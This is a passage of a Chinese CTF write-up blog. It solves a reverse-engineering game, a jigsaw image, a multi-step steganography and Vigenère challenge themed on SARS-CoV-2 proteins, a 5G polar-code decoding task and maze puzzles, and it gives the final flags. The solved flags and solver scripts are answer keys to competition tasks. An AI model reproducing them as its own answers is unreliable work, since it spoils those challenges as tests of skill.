<span class="hljs-number">0</span>, <span class="hljs-number">2</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>,},</span><br><span class="line">                              },</span><br><span class="line">                              ……………………………………</span><br><span class="line">                              {</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>,},</span><br><span class="line">                                      {<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>,},</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>,},</span><br><span class="line">                                      {<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>,},</span><br><span class="line">                                      {<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>,},</span><br><span class="line">                              },</span><br><span class="line">                              {</span><br><span class="line">                                      {<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                                      {<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>,},</span><br><span class="line">                                      {<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>,},</span><br><span class="line">                                      {<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,},</span><br><span class="line">                              },</span><br><span class="line">    };</span><br><span class="line">    <span class="hljs-keyword">int</span> res[<span class="hljs-number">36</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">36</span>; i++) {</span><br><span class="line">        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">7</span>; j++) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">runGame</span>(gameMap[i], j)) {</span><br><span class="line">                res[i] = j;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    std::string charDic = <span class="hljs-string">"0123456789abcdef-"</span>;</span><br><span class="line">    <span class="hljs-keyword">int</span> base[] = {<span class="hljs-number">0x17</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x10</span>,</span><br><span class="line">                  <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x09</span>,</span><br><span class="line">                  <span class="hljs-number">0x23</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0A</span>,</span><br><span class="line">                  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x15</span>};</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="hljs-string">"flag{"</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">36</span>; i++)</span><br><span class="line">        std::cout &lt;&lt; charDic[(res[i] + base[i]) % <span class="hljs-number">17</span>];</span><br><span class="line">    std::cout &lt;&lt; <span class="hljs-string">"}"</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//flag{ace40f94-1b3d-d97f-f256-bb726e611fa7}</span></span><br></pre></td></tr></tbody></table></figure><h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>每个碎片都加了噪声，还有很多碎片有很大部分重复内容，就算是拼出来图片也看不清楚是什么字符……</p><p>但是又太菜了写不出脚本识别，就只能手动拼图+ps识图</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{w<span class="hljs-number">9</span>w<span class="hljs-number">45</span>my<span class="hljs-number">6</span>x<span class="hljs-number">8</span>kk<span class="hljs-number">4</span>e<span class="hljs-number">8</span>gp<span class="hljs-number">9</span>nqm<span class="hljs-number">6</span>j<span class="hljs-number">2</span>c<span class="hljs-number">154</span>wad<span class="hljs-number">49</span>}</span><br></pre></td></tr></tbody></table></figure><h2 id="2019-nCoV"><a href="#2019-nCoV" class="headerlink" title="2019-nCoV"></a>2019-nCoV</h2><p>有三个文件，mp3，wav和一个压缩包，然后题目新增了一个hint，很容易看出来base32编码</p><figure class="highlight awk hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="hljs-regexp">//</span>www.merrybio.com.cn<span class="hljs-regexp">/blog/</span>SARS-CoV-<span class="hljs-number">2</span>-genomic-analysis.html</span><br><span class="line">https:<span class="hljs-regexp">//</span>www.ncbi.nlm.nih.gov<span class="hljs-regexp">/orffinder/</span></span><br><span class="line">http:<span class="hljs-regexp">//</span>www.merrybio.com.cn<span class="hljs-regexp">/blog/</span>coronavirus-introduction.html</span><br><span class="line"></span><br><span class="line">Please notice The largest structural protein</span><br><span class="line">the password is the md5(it<span class="hljs-string">'s gene sequence) and do not let the ‘\n’ in md5()</span></span><br></pre></td></tr></tbody></table></figure><p>给的文章有新冠病毒的介绍和基因查询页面，根据提示要算S蛋白质的基因序列的md5得到密码，这个密码是mp3隐写的密码，用MP3Stego解出来又一个密码“2019-nCoV”，试了一下是压缩包密码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="hljs-string">"MFLLTTKRTMFVFLVLLPLVSSQCVNLTTRTQLPPAYTNSFTRGVYYPDKVFRSSVLHSTQDLFLPFFSNVTWFHAIHVSGTNGTKRFDNPVLPFNDGVYFASTEKSNIIRGWIFGTTLDSKTQSLLIVNNATNVVIKVCEFQFCNDPFLGVYYHKNNKSWMESEFRVYSSANNCTFEYVSQPFLMDLEGKQGNFKNLREFVFKNIDGYFKIYSKHTPINLVRDLPQGFSALEPLVDLPIGINITRFQTLLALHRSYLTPGDSSSGWTAGAAAYYVGYLQPRTFLLKYNENGTITDAVDCALDPLSETKCTLKSFTVEKGIYQTSNFRVQPTESIVRFPNITNLCPFGEVFNATRFASVYAWNRKRISNCVADYSVLYNSASFSTFKCYGVSPTKLNDLCFTNVYADSFVIRGDEVRQIAPGQTGKIADYNYKLPDDFTGCVIAWNSNNLDSKVGGNYNYLYRLFRKSNLKPFERDISTEIYQAGSTPCNGVEGFNCYFPLQSYGFQPTNGVGYQPYRVVVLSFELLHAPATVCGPKKSTNLVKNKCVNFNFNGLTGTGVLTESNKKFLPFQQFGRDIADTTDAVRDPQTLEILDITPCSFGGVSVITPGTNTSNQVAVLYQDVNCTEVPVAIHADQLTPTWRVYSTGSNVFQTRAGCLIGAEHVNNSYECDIPIGAGICASYQTQTNSPRRARSVASQSIIAYTMSLGAENSVAYSNNSIAIPTNFTISVTTEILPVSMTKTSVDCTMYICGDSTECSNLLLQYGSFCTQLNRALTGIAVEQDKNTQEVFAQVKQIYKTPPIKDFGGFNFSQILPDPSKPSKRSFIEDLLFNKVTLADAGFIKQYGDCLGDIAARDLICAQKFNGLTVLPPLLTDEMIAQYTSALLAGTITSGWTFGAGAALQIPFAMQMAYRFNGIGVTQNVLYENQKLIANQFNSAIGKIQDSLSSTASALGKLQDVVNQNAQALNTLVKQLSSNFGAISSVLNDILSRLDKVEAEVQIDRLITGRLQSLQTYVTQQLIRAAEIRASANLAATKMSECVLGQSKRVDFCGKGYHLMSFPQSAPHGVVFLHVTYVPAQEKNFTTAPAICHDGKAHFPREGVFVSNGTHWFVTQRNFYEPQIITTDNTFVSGNCDVVIGIVNNTVYDPLQPELDSFKEELDKYFKNHTSPDVDLGDISGINASVVNIQKEIDRLNEVAKNLNESLIDLQELGKYEQYIKWPWYIWLGFIAGLIAIVMVTIMLCCMTSCCSCLKGCCSCGSCCKFDEDDSEPVLKGVKLHYT"</span>.encode())</span><br><span class="line"><span class="hljs-built_in">print</span>(m.hexdigest())</span><br><span class="line"><span class="hljs-comment"># 98eb1b1760bcc837934c8695a1cee923</span></span><br></pre></td></tr></tbody></table></figure><p>wav是lsb隐写，直接用SilentEye解码得到一串没什么意义的字符“priebeijoarkjpxmdkucxwdus”</p><p>压缩包得到一张图片和hint2</p><p>hint2 16进制转ascii码得到第二个提示</p><figure class="highlight livecodeserver hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">you must pay attention <span class="hljs-built_in">to</span> N protein ,How <span class="hljs-built_in">do</span> that <span class="hljs-built_in">get</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> viral capsid?</span><br><span class="line"><span class="hljs-built_in">do</span> you know steghide?</span><br><span class="line"><span class="hljs-keyword">the</span> password is <span class="hljs-built_in">encrypt</span> <span class="hljs-keyword">by</span> VigenÃ¨re Cipher</span><br><span class="line"><span class="hljs-keyword">the</span> screct key is The top <span class="hljs-number">20</span> <span class="hljs-keyword">characters</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> most occurrences are counted+COMBAT<span class="hljs-string">'</span></span><br></pre></td></tr></tbody></table></figure><p>图片应该是用steghide做的隐写，隐写的密码是刚刚wav隐写得到的字符经过维吉尼亚密码解码之后的结果，但是维吉尼亚密码的密钥就跟第一句不明不白的话有关系，卡了很久，后来仔细看一下文章，有这么一句话</p><figure class="highlight mathematica hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">核衣壳蛋白（<span class="hljs-variable">nucleoprotein</span>，<span class="hljs-built_in">N</span>）位于囊膜内部，呈螺旋状，包裹着病毒单股正链的<span class="hljs-variable">RNA</span>基因组。病毒在进行装配时，<span class="hljs-built_in">N</span>蛋白先和病毒<span class="hljs-variable">RNA</span>相互作用形成复合体形式，然后再结合<span class="hljs-variable">M</span>蛋白、<span class="hljs-built_in">E</span>蛋白，最后被包装进入病毒衣壳内。</span><br></pre></td></tr></tbody></table></figure><p>猜测是对N蛋白质、M蛋白质、E蛋白质的基因序列进行词频统计</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dic = {}</span><br><span class="line">N=<span class="hljs-string">"MSDNGPQNQRNAPRITFGGPSDSTGSNQNGERSGARSKQRRPQGLPNNTASWFTALTQHGKEDLKFPRGQGVPINTNSSPDDQIGYYRRATRRIRGGDGKMKDLSPRWYFYYLGTGPEAGLPYGANKDGIIWVATEGALNTPKDHIGTRNPANNAAIVLQLPQGTTLPKGFYAEGSRGGSQASSRSSSRSRNSSRNSTPGSSRGTSPARMAGNGGDAALALLLLDRLNQLESKMSGKGQQQQGQTVTKKSAAEASKKPRQKRTATKAYNVTQAFGRRGPEQTQGNFGDQELIRQGTDYKHWPQIAQFAPSASAFFGMSRIGMEVTPSGTWLTYTGAIKLDDKDPNFKDQVILLNKHIDAYKTFPPTEPKKDKKKKADETQALPQRQKKQQTVTLLPAADLDDFSKQLQQSMSSADSTQAMFHLVDFQVTIAEILLIIMRTFKVSIWNLDYIINLIIKNLSKSLTENKYSQLDEEQPMEIDMADSNGTITVEELKKLLEQWNLVIGFLFLTWICLLQFAYANRNRFLYIIKLIFLWLLWPVTLACFVLAAVYRINWITGGIAIAMACLVGLMWLSYFIASFRLFARTRSMWSFNPETNILLNVPLHGTILTRPLLESELVIGAVILRGHLRIAGHHLGRCDIKDLPKEITVATSRTLSYYKLGASQRVAGDSGFAAYSRYRIGNYKLNTDHSSSSDNIALLVQ"</span></span><br><span class="line"><span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> N:</span><br><span class="line">    <span class="hljs-keyword">if</span> word <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> dic:</span><br><span class="line">        dic[word] = <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        dic[word] = dic[word] + <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">swd = <span class="hljs-built_in">sorted</span>(dic.items(), key=<span class="hljs-keyword">lambda</span> asd: asd[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)</span><br><span class="line"><span class="hljs-built_in">print</span>(swd)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># LGASTRIQKNDPFEVYMWHC</span></span><br></pre></td></tr></tbody></table></figure><p>一共20个字符按照频次从高到低的顺序排列，在后面添加COMBAT得到密钥<code>LGASTRIQKNDPFEVYMWHCCOMBAT</code></p><p>解维吉尼亚密码得到隐写的密码<code>eliminatenovelcoronavirts</code></p><p>用steghide解出flag</p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">flag</span><span class="hljs-template-variable">{we_will_over_come_SARS-COV}</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-全国工业互联网安全技术技能大赛</title>
      <link href="/2020/10/24/2020-10-24-2020-%E5%85%A8%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/2020/10/24/2020-10-24-2020-%E5%85%A8%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>2020-全国工业互联网安全技术技能大赛</p><span id="more"></span><h2 id="5G"><a href="#5G" class="headerlink" title="5G"></a>5G</h2><p>考查polar编码</p><figure class="highlight cpp hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">sub_401FD0</span>();</span><br><span class="line">  v3 = <span class="hljs-built_in">time</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  <span class="hljs-built_in">srand</span>(v3);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;v32, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>u);</span><br><span class="line">  v30 = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(dword_40F040 + <span class="hljs-number">1</span>);</span><br><span class="line">  <span class="hljs-built_in">sub_40E540</span>(<span class="hljs-string">"%64s"</span>, &amp;v32);</span><br><span class="line">  v26 = (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">double</span>)<span class="hljs-built_in">sub_4029B0</span>((<span class="hljs-keyword">long</span> <span class="hljs-keyword">double</span>)dword_40F040);</span><br><span class="line">  v29 = dword_40F040;</span><br><span class="line">  v4 = <span class="hljs-number">4</span> * (dword_40F040 / <span class="hljs-number">2</span>);</span><br><span class="line">  v31 = dword_40F040 / <span class="hljs-number">2</span>;</span><br><span class="line">  v5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">4</span> * (dword_40F040 / <span class="hljs-number">2</span>));</span><br><span class="line">  v28 = <span class="hljs-built_in">malloc</span>(v4);</span><br><span class="line">  <span class="hljs-built_in">memcpy</span>(v5, &amp;dword_40F080, v4);</span><br><span class="line">  <span class="hljs-built_in">memcpy</span>(v28, (<span class="hljs-keyword">char</span> *)&amp;dword_40F080 + v4, v4);</span><br><span class="line">  v6 = <span class="hljs-number">0</span>;</span><br><span class="line">  v27 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">4</span> * v29);</span><br><span class="line">  <span class="hljs-built_in">memset</span>(v27, <span class="hljs-number">0</span>, <span class="hljs-number">4</span> * v29);</span><br><span class="line">  v7 = v30;</span><br><span class="line">  <span class="hljs-keyword">do</span></span><br><span class="line">  {</span><br><span class="line">     <span class="hljs-built_in">LOBYTE</span>(v8) = *((_BYTE *)&amp;v32 + v6);</span><br><span class="line">     v9 = <span class="hljs-number">0</span>;</span><br><span class="line">     <span class="hljs-keyword">do</span></span><br><span class="line">     {</span><br><span class="line">        v10 = v8 &amp; <span class="hljs-number">1</span>;</span><br><span class="line">        v8 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(<span class="hljs-keyword">char</span>)v8 &gt;&gt; <span class="hljs-number">1</span>;</span><br><span class="line">        v7[v9++] = v10;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">while</span> ( v9 != <span class="hljs-number">8</span> );</span><br><span class="line">      ++v6;</span><br><span class="line">      v7 += <span class="hljs-number">8</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">while</span> ( v6 != <span class="hljs-number">64</span> );</span><br></pre></td></tr></tbody></table></figure><p>main函数开始先输入64个字符，然后转换成比特，共512位，进行编码和传输，题目中给了输出可以根据输出进行解码求输入，解码部分根据提示利用开源代码<a href="https://github.com/albusSimba/pyPolar">https://github.com/albusSimba/pyPolar</a>实现，但是解码出来的数据位数是1024位，在编码最开始赋值的时候还有一个类似于换表的操作，将512位数据打乱写入1024位的矩阵中，所以解码的时候还需要提取出输入的512位，才可以得到最终结果</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> QueryPerformanceCounter <span class="hljs-keyword">import</span> *</span><br><span class="line"><span class="hljs-keyword">from</span> polarcodes5G <span class="hljs-keyword">import</span> *</span><br><span class="line">​</span><br><span class="line">n = <span class="hljs-number">1024</span></span><br><span class="line">k = n // <span class="hljs-number">2</span></span><br><span class="line">performance_counter = QueryPerformanceCounter()</span><br><span class="line">myPC = Construct(n, k)</span><br><span class="line">s = <span class="hljs-string">"-1.756208 1.027628 -0.952465 -1.638855 -1.462390 0.208588 0.591268 -0.179454 1.095095 0.447900 0.947692 1.350273 -1.155633 -1.938154 0.046054 1.175568 -0.007052 1.220866 1.890119 1.539061 0.677526 -0.493938 1.113000 1.148966 0.437962 -1.025365 -1.001201 -0.274902 0.545109 -1.125495 -1.112381 0.214771 0.635569 …………"</span></span><br><span class="line">t = [<span class="hljs-built_in">float</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s.split(<span class="hljs-string">" "</span>)]</span><br><span class="line">myPC.llrs = np.array(t)</span><br><span class="line">performance_counter.start()</span><br><span class="line">Decoder(myPC)</span><br><span class="line">performance_counter.end(<span class="hljs-string">"Decoder"</span>)</span><br><span class="line">res = <span class="hljs-built_in">list</span>(myPC.message_received)</span><br><span class="line">bits = <span class="hljs-built_in">list</span>(myPC.msg_bits)</span><br><span class="line">f = [<span class="hljs-number">0</span>] * <span class="hljs-number">512</span></span><br><span class="line"><span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(bits):</span><br><span class="line">   f[i] = res[c]</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">512</span>, <span class="hljs-number">8</span>):</span><br><span class="line">   ch = <span class="hljs-number">0</span></span><br><span class="line">   <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):</span><br><span class="line">       ch += (f[i + j] &amp;lt;&amp;lt; j) &amp;amp; <span class="hljs-number">0xff</span></span><br><span class="line">   <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(ch), end=<span class="hljs-string">""</span>)</span><br><span class="line">​</span><br><span class="line"><span class="hljs-comment"># Congratz!Your_flag_is:flag{632828e1-5b6f-4bae-9320-a2808d193a23}</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-巅峰极客</title>
      <link href="/2020/09/26/2020-09-26-2020-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>/2020/09/26/2020-09-26-2020-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>2020-巅峰极客</p><span id="more"></span><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h2 id="virus"><a href="#virus" class="headerlink" title="virus"></a>virus</h2><p>简单的迷宫题，开始先输入四个数选择地图顺序，然后输入以wasd组成的操作序列，用-隔开，每一个序列都会有长度限制，对应了四个迷宫不同的路线长度，所以把迷宫找出来就解出来了</p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">maze1</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">s………</span>|||</span><br><span class="line"></span><br><span class="line">|||||||||||<span class="hljs-string">.</span>|||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">d</span>||||||||<span class="hljs-string">.</span>|||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||<span class="hljs-string">.</span>|||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">.</span>||||||||<span class="hljs-string">.</span>|||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">……….</span>|||</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br></pre></td></tr></tbody></table></figure><p>start (3,2) a2=1</p><p>dddddddddsssssaaaaaaaaawww</p><p>len=26</p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">maze2</span><br><span class="line"></span><br><span class="line">|||||||||||||||||||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">s</span>|||||||||||||<span class="hljs-string">d</span>||</span><br><span class="line"></span><br><span class="line">||<span class="hljs-string">..</span>|||||||||||<span class="hljs-string">..</span>||</span><br><span class="line"></span><br><span class="line">|||<span class="hljs-string">..</span>|||||||||<span class="hljs-string">..</span>|||</span><br><span class="line"></span><br><span class="line">||||<span class="hljs-string">..</span>|||||||<span class="hljs-string">..</span>||||</span><br><span class="line"></span><br><span class="line">|||||<span class="hljs-string">..</span>|||||<span class="hljs-string">..</span>|||||</span><br><span class="line"></span><br><span class="line">||||||<span class="hljs-string">..</span>|||<span class="hljs-string">..</span>||||||</span><br><span class="line"></span><br><span class="line">|||||||<span class="hljs-string">..</span>|<span class="hljs-string">..</span>|||||||</span><br><span class="line"></span><br><span class="line">||||||||<span class="hljs-string">…</span>||||||||</span><br><span class="line"></span><br><span class="line">|||||||||||||||||||</span><br></pre></td></tr></tbody></table></figure><p>start (1,2) a2=2</p><p>sdsdsdsdsdsdsddwdwdwdwdwdwdw</p><p>len=28</p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">maze3</span><br><span class="line"></span><br><span class="line">|||||||||||||||</span><br><span class="line"></span><br><span class="line">||<span 